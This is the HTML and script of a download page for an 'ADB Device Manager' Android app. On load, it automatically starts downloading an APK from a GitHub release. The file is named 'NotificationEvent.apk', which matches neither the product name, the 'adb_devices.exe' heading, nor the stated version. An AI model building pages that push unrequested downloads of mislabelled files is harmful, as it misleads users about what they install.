<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Download ADB Device Manager for Android</title>
  <link rel="stylesheet" href="style.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    html, body {
      height: 100%;
      margin: 0;
      overflow: hidden;
    }
    
    body {
      display: flex;
      align-items: center;
      justify-content: center;
    }
    
    .download-container {
      width: 100%;
      max-width: 800px;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 2vh 20px;
      box-sizing: border-box;
    }
    
    .download-card {
      background: var(--white);
      border-radius: var(--border-radius);
      padding: clamp(15px, 5vh, 40px);
      box-shadow: var(--box-shadow);
      text-align: center;
      transition: var(--transition);
      width: 100%;
      box-sizing: border-box;
    }
    
    .platform-icon {
      font-size: clamp(3rem, 8vw, 5rem);
      color: var(--primary-color);
      margin-bottom: 2vh;
    }
    
    .platform-name {
      font-size: 2rem;
      margin-bottom: 15px;
    }
    
    .platform-details {
      margin-bottom: 30px;
      color: var(--dark-gray);
      font-size: 1.1rem;
    }
    
    .features-list {
      max-width: 500px;
      margin: 0 auto 30px;
      text-align: left;
    }
    
    .features-list li {
      margin-bottom: 12px;
      position: relative;
      padding-left: 30px;
      list-style-type: none;
    }
    
    .features-list li:before {
      content: "\f058";
      font-family: "Font Awesome 6 Free";
      font-weight: 900;
      position: absolute;
      left: 0;
      color: var(--primary-color);
    }
    
    .manual-download-msg {
      margin-top: 3vh;
      padding: 10px;
      background-color: #f8f9fa;
      border-radius: 8px;
      font-size: clamp(0.8rem, 2vw, 1rem);
      color: #555;
    }
    
    .download-btn {
      display: inline-block;
      padding: clamp(10px, 2vh, 16px) clamp(20px, 4vw, 40px);
      background-color: var(--primary-color);
      color: var(--white);
      border-radius: var(--border-radius);
      font-weight: 500;
      font-size: clamp(0.9rem, 2vw, 1.1rem);
      transition: var(--transition);
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      white-space: nowrap;
    }
    
    .download-btn:hover {
      background-color: var(--primary-dark);
      transform: translateY(-2px);
      box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
    }
    
    .download-btn i {
      margin-right: 10px;
    }
    
    .system-requirements {
      font-size: clamp(0.7rem, 2vw, 0.9rem);
      color: var(--dark-gray);
      margin-top: 2vh;
    }
    
    #download-progress {
      margin-top: 2vh;
      display: none;
    }
    
    .progress-text {
      margin-bottom: 1vh;
      color: var(--primary-color);
      font-weight: 500;
    }
    
    @media (max-height: 500px) {
      .download-container {
        padding: 10px;
      }
      .platform-icon {
        margin-bottom: 10px;
      }
      .manual-download-msg {
        margin-top: 10px;
      }
    }
  </style>
</head>
<body>
  <section class="download-container">
    <div class="download-header" style="text-align: center; margin: 40px 0;">
      <h1 style="font-size: 2.2rem; font-weight: bold; line-height: 1.3;">
        Download for Android<br>
        From <span style="color: var(--primary-color);">adb_devices.exe</span>
      </h1>
    </div>
    
    
    <div class="download-card">
      <div class="platform-icon">
        <i class="fab fa-android"></i>
      </div>

      <div id="download-progress">
        <p class="progress-text">
          <p>Your download is starting automatically...</p>
        </p>
      </div>
      
      <div class="manual-download-msg">
        If your download doesn't start automatically, 
        <a href="https://github.com/Shrey113/Adb-Device-Manager-download-page/releases/download/Awesome_App_V_0.2/NotificationEvent.apk" id="manual-download-btn" class="download-btn">
          <i class="fas fa-download"></i> Click here
        </a>
      </div>
      
      <p class="system-requirements">Version 0.9.5 • 12.3 MB • Android 8.0+</p>
    </div>
  </section>

  <script>
    // Auto start download when page loads
    window.addEventListener('load', function() {
      const downloadUrl = "https://github.com/Shrey113/Adb-Device-Manager-download-page/releases/download/Awesome_App_V_0.2/NotificationEvent.apk";
      const downloadLink = document.createElement('a');
      downloadLink.href = downloadUrl;
      downloadLink.download = downloadUrl.split('/').pop();
      document.body.appendChild(downloadLink);
      
      // Start download
      setTimeout(function() {
        downloadLink.click();
        document.getElementById('download-progress').style.display = 'block';
      }, 1000);
      
      document.body.removeChild(downloadLink);
    });
    
    // Manual download button
    document.getElementById('manual-download-btn').addEventListener('click', function(e) {
      document.getElementById('download-progress').style.display = 'block';
    });
  </script>
</body>
</html>
